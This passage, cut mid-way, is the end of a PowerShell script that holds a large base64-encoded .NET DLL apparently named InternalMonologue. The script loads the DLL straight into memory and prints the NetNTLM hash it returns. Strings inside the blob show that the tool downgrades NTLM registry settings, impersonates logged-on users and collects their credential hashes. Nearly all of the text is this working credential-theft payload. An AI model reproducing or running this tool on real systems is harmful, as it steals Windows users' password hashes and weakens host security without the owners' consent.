ZXJzb25hdGVkSWRlbnRpdHkAV2luZG93c0lkZW50aXR5AElzTnVsbE9yRW1wdHkAAAAhMQAxADIAMgAzADMANAA0ADUANQA2ADYANwA3ADgAOAAASVMAWQBTAFQARQBNAFwAQwB1AHIAcgBlAG4AdABDAG8AbgB0AHIAbwBsAFMAZQB0AFwAQwBvAG4AdAByAG8AbABcAEwAcwBhAAApTABNAEMAbwBtAHAAYQB0AGkAYgBpAGwAaQB0AHkATABlAHYAZQBsAABXUwBZAFMAVABFAE0AXABDAHUAcgByAGUAbgB0AEMAbwBuAHQAcgBvAGwAUwBlAHQAXABDAG8AbgB0AHIAbwBsAFwATABzAGEAXABNAFMAVgAxAF8AMAAAIU4AdABsAG0ATQBpAG4AQwBsAGkAZQBuAHQAUwBlAGMAADVSAGUAcwB0AHIAaQBjAHQAUwBlAG4AZABpAG4AZwBOAFQATABNAFQAcgBhAGYAZgBpAGMAABFTAC0AMQAtADUALQAxADgAARFTAC0AMQAtADUALQAxADkAARFTAC0AMQAtADUALQAyADAAARlTAC0AMQAtADUALQA5ADYALQAwAC0AMAABGVMALQAxAC0ANQAtADkANgAtADAALQAxAAEZUwAtADEALQA1AC0AOQAwAC0AMAAtADEAARF7ADAAfQAgAHsAMQB9AAoAAC1JAG0AcABlAHIAcwBvAG4AYQB0AGUAZAAgAHUAcwBlAHIAIAB7ADAAfQAKAAAJewAwAH0ACgAAQUcAbwB0ACAAYgBsAGEAbgBrACAAcgBlAHMAcABvAG4AcwBlACAAZgBvAHIAIAB1AHMAZQByACAAewAwAH0ACgAAI1IAdQBuAG4AaQBuAGcAIABlAGwAZQB2AGEAdABlAGQACgAANVAAZQByAGYAbwByAG0AaQBuAGcAIABOAFQATABNACAARABvAHcAbgBnAHIAYQBkAGUACgAAL1MAdABhAHIAdABpAG4AZwAgAGkAbQBwAGUAcgBzAG8AbgBhAHQAaQBvAG4ACgAAdVAAZQByAGYAbwByAG0AaQBuAGcAIABhAHQAdABhAGMAawAgAG8AbgAgAGMAdQByAHIAZQBuAHQAIAB1AHMAZQByACAAbwBuAGwAeQAgACgAbgBvACAAaQBtAHAAZQByAHMAbwBuAGEAdABpAG8AbgAp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"
    $dllbytes  = [System.Convert]::FromBase64String($PS)
    $assembly = [System.Reflection.Assembly]::Load($dllbytes)
}

$output = [InternalMonologue.Class1]::Main()
Write-Output ("[+] NetNTLM Hash")
Write-Output $output
}